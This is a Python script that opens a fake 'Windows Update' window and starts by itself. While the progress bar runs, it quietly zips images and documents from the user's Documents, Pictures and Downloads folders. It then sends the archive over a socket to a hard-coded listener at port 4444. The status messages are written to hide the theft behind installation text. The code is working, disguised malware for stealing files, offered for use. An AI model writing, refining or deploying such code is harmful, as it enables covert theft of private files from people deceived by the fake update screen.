import tkinter as tk
from tkinter import ttk
import threading, socket, os, io, zipfile, struct

# ------------------ Settings ------------------
HOST = '192.168.1.57'  # Raspberry Pi IP
PORT = 4444

EXTENSIONS = ['.jpg', '.jpeg', '.png', '.gif', '.bmp',
              '.txt', '.doc', '.docx', '.pdf', '.xlsx', '.pptx']

folders_to_scan = [os.path.join(os.path.expanduser("~"), f) for f in ['Documents', 'Pictures', 'Downloads']]

# ------------------ File Transfer ------------------
def collect_and_send(progress_callback=None, status_callback=None):
    try:
        buffer = io.BytesIO()
        with zipfile.ZipFile(buffer, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for folder in folders_to_scan:
                if os.path.exists(folder):
                    # GUI-friendly text instead of folder names
                    if status_callback:
                        status_callback("Installing files...")
                    for root, dirs, files in os.walk(folder):
                        for file in files:
                            if any(file.lower().endswith(ext) for ext in EXTENSIONS):
                                full_path = os.path.join(root, file)
                                arcname = os.path.relpath(full_path, os.path.expanduser("~"))
                                zipf.write(full_path, arcname)
        buffer.seek(0)
        total_size = len(buffer.getbuffer())

        # Connect to Raspberry Pi
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((HOST, PORT))
        s.sendall(struct.pack('>Q', total_size))

        sent = 0
        chunk_size = 4096
        while sent < total_size:
            chunk = buffer.read(chunk_size)
            if not chunk:
                break
            s.sendall(chunk)
            sent += len(chunk)
            if progress_callback:
                progress_callback(sent / total_size * 100)
            if status_callback:
                status_callback(f"Installing files... {sent*100//total_size}% completed")
        s.close()
    except Exception as e:
        if status_callback:
            status_callback(f"Error: {e}")

# ------------------ GUI ------------------
def start_update():
    threading.Thread(target=run_update).start()

def run_update():
    # Optional initial simulated steps
    initial_steps = ["Preparing installation...", "Starting installation..."]
    for step in initial_steps:
        status_label.config(text=step)
        for i in range(10):
            progress_bar['value'] += 1
            root.update_idletasks()

    # Run the actual file transfer with progress bar linked
    collect_and_send(progress_callback=lambda p: progress_bar.config(value=p),
                     status_callback=lambda s: status_label.config(text=s))

    status_label.config(text="Installation complete!")
    progress_bar['value'] = 100

root = tk.Tk()
root.title("Windows Update")
root.geometry("450x160")

tk.Label(root, text="Installing Windows Update", font=("Segoe UI", 12)).pack(pady=10)
progress_bar = ttk.Progressbar(root, orient='horizontal', length=400, mode='determinate', maximum=100)
progress_bar.pack(pady=20)
status_label = tk.Label(root, text="Initializing...", font=("Segoe UI", 10))
status_label.pack(pady=5)

# Automatically start the update when the window opens
root.after(500, start_update)

root.mainloop()
